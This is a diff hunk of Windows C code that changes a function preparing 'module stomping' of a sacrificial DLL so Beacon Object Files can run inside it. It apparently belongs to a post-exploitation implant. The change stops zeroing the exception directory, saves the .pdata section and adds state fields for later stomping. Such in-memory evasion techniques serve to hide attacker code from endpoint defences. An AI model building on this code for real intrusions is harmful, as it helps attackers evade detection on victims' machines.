@@ -145,43 +145,39 @@ static BOOL InitBofStompLoadLibrary(const char* sacrificialDll)
             pdataBase = (PVOID)((ULONG_PTR)hMod + excDir->VirtualAddress);
             pdataSize = excDir->Size;
         }
-        DWORD hdProt = 0;
-        if (ApiWin->VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &hdProt)) {
-            excDir->VirtualAddress = 0;
-            excDir->Size           = 0;
-            ApiWin->VirtualProtect(excDir, sizeof(IMAGE_DATA_DIRECTORY), hdProt, &hdProt);
-        }
     }
 
     PVOID savedPdata = NULL;
     if (pdataBase && pdataSize) {
         savedPdata = MemAllocLocal(pdataSize);
-        if (savedPdata) {
-            memcpy(savedPdata, pdataBase, pdataSize);
-            DWORD pdataProt = 0;
-            ApiWin->VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &pdataProt);
-            memset(pdataBase, 0, pdataSize);
-            ApiWin->VirtualProtect(pdataBase, pdataSize, pdataProt, &pdataProt);
+        if (!savedPdata) {
+            LPVOID savedPtr = saved;
+            MemFreeLocal(&savedPtr, (DWORD)textSize);
+            return FALSE;
         }
+        memcpy(savedPdata, pdataBase, pdataSize);
     }
 
     ApiWin->InitializeCriticalSection(&g_BofStomp.lock);
 
-    g_BofStomp.hModule     = hMod;
-    g_BofStomp.mappedView  = NULL;
-    g_BofStomp.viewSize    = 0;
-    g_BofStomp.method      = 0;
-    g_BofStomp.textBase    = textBase;
-    g_BofStomp.textSize    = textSize;
-    g_BofStomp.savedBytes  = saved;
-    g_BofStomp.savedSize   = (DWORD)textSize;
-    g_BofStomp.pdataBase   = pdataBase;
-    g_BofStomp.pdataSize   = pdataSize;
-    g_BofStomp.savedPdata  = savedPdata;
-    g_BofStomp.cursorBase  = NULL;
-    g_BofStomp.cursorSize  = 0;
-    g_BofStomp.inUse       = FALSE;
-    g_BofStomp.initialised = TRUE;
+    g_BofStomp.hModule       = hMod;
+    g_BofStomp.mappedView    = NULL;
+    g_BofStomp.viewSize      = 0;
+    g_BofStomp.method        = 0;
+    g_BofStomp.textBase      = textBase;
+    g_BofStomp.textSize      = textSize;
+    g_BofStomp.savedBytes    = saved;
+    g_BofStomp.savedSize     = (DWORD)textSize;
+    g_BofStomp.pdataBase     = pdataBase;
+    g_BofStomp.pdataSize     = pdataSize;
+    g_BofStomp.savedPdata    = savedPdata;
+    g_BofStomp.pdataCapacity = pdataSize ? (pdataSize / (sizeof(DWORD) * 3)) : 0;
+    g_BofStomp.moduleBase    = (PVOID)hMod;
+    g_BofStomp.pdataStomped  = FALSE;
+    g_BofStomp.cursorBase    = NULL;
+    g_BofStomp.cursorSize    = 0;
+    g_BofStomp.inUse         = FALSE;
+    g_BofStomp.initialised   = TRUE;
 
     return TRUE;
 }
